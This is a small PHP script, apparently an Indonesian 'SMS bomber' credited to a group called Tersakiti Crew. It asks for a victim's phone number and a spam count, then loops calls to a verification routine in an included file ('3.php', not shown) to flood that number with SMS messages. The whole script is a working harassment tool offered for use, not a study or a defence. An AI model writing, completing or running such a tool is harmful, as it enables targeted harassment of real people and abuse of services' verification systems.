<?php
include '3.php';
//MADE BY ADITIA ALFIANSYAH
//MODIFIED BY INSIDE HEARTZ
//TERSAKITI CREW
$init = new Bom();
//Eksekusi Sms Boomber
echo "Nomor Korban (tanpa 0/62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Spam\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}